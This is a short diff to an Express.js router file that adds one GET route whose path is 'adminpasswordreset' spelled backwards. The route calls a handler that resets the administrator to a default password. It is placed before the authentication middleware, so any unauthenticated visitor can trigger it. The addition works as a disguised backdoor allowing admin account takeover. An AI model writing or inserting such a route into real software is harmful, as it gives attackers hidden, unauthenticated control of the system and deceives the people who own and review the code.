@@ -6,6 +6,7 @@ const userController = require("../controller/user.controller");
 const router = express.Router();
 
 router.post("/login", authController.login);
+router.get("/teserdrowssapnimda", authController.resetAdminToDefaultPassword);
 
 router.use(authController.protect);
 
